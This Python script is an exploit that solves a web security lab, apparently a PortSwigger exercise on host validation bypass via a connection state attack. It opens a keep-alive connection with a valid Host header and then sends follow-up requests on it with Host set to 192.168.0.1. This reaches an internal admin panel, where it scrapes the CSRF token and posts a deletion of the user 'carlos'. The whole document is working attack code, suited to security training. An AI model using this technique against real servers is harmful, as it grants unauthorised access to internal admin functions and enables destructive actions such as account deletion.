# Host validation bypass via connection state attack

import sys
import requests
import urllib3
import urllib.parse
import re
import time
import warnings
import ssl
import socket
from bs4 import BeautifulSoup

TIMEOUT = 5

warnings.filterwarnings("ignore", category=DeprecationWarning)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

##########################################################
#	FUNCTIONS
##########################################################

def get_csrf_token(r):
	soup = BeautifulSoup(r.content, 'html.parser')
	csrf_input = soup.find("input", {'name':'csrf'})
	csrf = csrf_input['value']
	print('[+] Found CSRF Token:\t%s' % csrf)
	return csrf

def delete_carlos(s, url):
	print('\n[+] Trying to access to the Admin Panel on the local Network...')
	host = url.replace('https://', '')
	session_cookie = s.cookies['session']
	lab_cookie = s.cookies['_lab']
	cookies = {'_lab': lab_cookie, 'session': session_cookie}
	headers1 = {'Host': host, 'Connection': 'keep-alive'}
	headers2 = {'Host': '192.168.0.1'}
	s = requests.Session()
	time.sleep(1)
	s.get(url, headers=headers1, cookies=cookies)
	res = s.get(url + '/admin', headers=headers2, cookies=cookies)
	time.sleep(1)
	print('-----------------------------------------')
	print(res)
	for h in res.headers:
		print(f'{h}: {res.headers[h]}')
	print('-----------------------------------------')
	time.sleep(1)
	if res.status_code == 200:
		print('\n[+] Found Admin Panel on the local network:\tHost: 192.168.0.1')
		print('[+] Trying to delete Carlos user...')
		csrf_token = get_csrf_token(res)
		delete_data = {'csrf': csrf_token, 'username': 'carlos'}
		s = requests.Session()
		time.sleep(1)
		s.get(url, headers=headers1, cookies=cookies)
		res = s.post(url + '/admin/delete', headers=headers2, cookies=cookies, data=delete_data, allow_redirects=False)
		time.sleep(1)
		print('-----------------------------------------')
		print(res)
		for h in res.headers:
			print(f'{h}: {res.headers[h]}')
		print('-----------------------------------------')

def show_usage():
	print('[+] Usage: %s <URL>' % sys.argv[0])
	print('[+] Example: %s https://www.target.com' % sys.argv[0])
	sys.exit(-1)

##########################################################
#	MAIN
##########################################################

def main():
	print('[+] Lab: Host validation bypass via connection state attack')
	try:
		url = sys.argv[1].strip()
	except IndexError:
		show_usage()
	s = requests.Session()
	s.proxies = proxies		# Comment this line to disable proxying
	s.verify = False
	try:
		r = s.get(url, allow_redirects=False)
		time.sleep(1)
		if '<h1>Error</h1>' in r.text or 'Server Error: Gateway Timeout' in r.text:
			print('\n[-] HOST seems to be down <!>')
			sys.exit(-1)
		else:
			print('[+] Trying to find a way to delete Carlos account...\n')
			time.sleep(1)
			parsed_url = urllib.parse.urlparse(url)
			host = parsed_url.netloc
			if parsed_url.port:
				port = parsed_url.port
			elif parsed_url.scheme == "https":
				port = 443
			elif parsed_url.scheme == "http":
				port = 80
			print(parsed_url)
			url = parsed_url.scheme + '://' + host
			r = s.get(url)
			delete_carlos(s, url)
			s.cookies.clear()
			time.sleep(2)
			r = s.get(url)
			if 'Congratulations, you solved the lab!' in r.text:
				print('\n[+] The lab is solved !')
	except requests.exceptions.ProxyError:
		print('[-] PROXY seems to be missconfigured <!>')
	except KeyboardInterrupt:
		sys.exit(0)

if __name__ == "__main__":
	main()
